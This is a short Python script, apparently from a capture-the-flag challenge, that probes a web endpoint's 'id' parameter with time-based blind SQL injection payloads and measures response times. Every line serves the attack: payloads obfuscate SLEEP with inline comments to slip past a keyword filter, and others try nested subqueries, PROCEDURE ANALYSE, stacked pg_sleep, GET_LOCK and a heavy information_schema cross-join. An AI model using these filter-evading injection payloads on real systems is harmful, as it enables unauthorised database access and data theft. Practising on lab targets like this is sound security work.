import requests, time
b='https://0541b0a5e26f92b4.chal.ctf.ae/'
def e(p):
    t=time.time()
    try: r=requests.get(b,params={'id':p},timeout=60)
    except Exception as ex: return ('ERR',str(ex)[:40])
    return (round(time.time()-t,2), r.status_code, len(r.content))
base=e('1'); print('base',base)
tests=[
 # obfuscated sleeps (defeat keyword filter)
 "1 AND/**/SLEEP(5)",
 "1 AND SLEEP/**/(5)",
 "1/*!50000AND*/SLEEP(5)",
 "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)",
 "1 procedure analyse(extractvalue(1,concat(0x7e,(select sleep(5)))),1)",
 # different db? maybe not mysql SLEEP; try pg_sleep
 "1;SELECT pg_sleep(5)",
 # gtid/get_lock
 "1 AND GET_LOCK(0x41,5)",
 # heavy without sleep keyword
 "1 AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)",
]
for p in tests:
    print(e(p), p)
